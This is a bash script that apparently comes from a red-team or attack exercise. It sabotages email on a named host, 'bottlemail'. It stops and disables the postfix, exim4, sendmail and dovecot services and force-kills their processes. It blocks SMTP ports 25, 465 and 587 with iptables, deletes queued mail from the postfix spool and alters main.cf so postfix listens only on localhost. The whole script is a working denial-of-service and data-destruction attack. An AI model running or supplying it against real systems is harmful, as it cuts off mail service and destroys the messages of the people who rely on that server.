#!/bin/bash
# bottlemail (10.111.1.2) - SMTP disruption
# Targets postfix (most common), falls back to exim4/sendmail

# Stop all common MTAs
systemctl stop postfix exim4 sendmail dovecot 2>/dev/null
systemctl disable postfix exim4 sendmail dovecot 2>/dev/null

pkill -9 postfix 2>/dev/null
pkill -9 master  2>/dev/null   # postfix master process
pkill -9 exim4   2>/dev/null
pkill -9 sendmail 2>/dev/null

# Block SMTP ports
iptables -I INPUT -p tcp --dport 25  -j DROP
iptables -I INPUT -p tcp --dport 465 -j DROP
iptables -I INPUT -p tcp --dport 587 -j DROP

# Nuke the postfix queue so even a restart starts empty and broken
if [ -d /var/spool/postfix ]; then
    rm -rf /var/spool/postfix/incoming/* 2>/dev/null
    rm -rf /var/spool/postfix/active/*   2>/dev/null
    rm -rf /var/spool/postfix/deferred/* 2>/dev/null
fi

# Corrupt main.cf so postfix can't start cleanly
if [ -f /etc/postfix/main.cf ]; then
    cp /etc/postfix/main.cf /etc/postfix/main.cf.bak 2>/dev/null
    echo "inet_interfaces = 127.0.0.1" >> /etc/postfix/main.cf
fi

echo "[*] SMTP disruption complete on bottlemail"
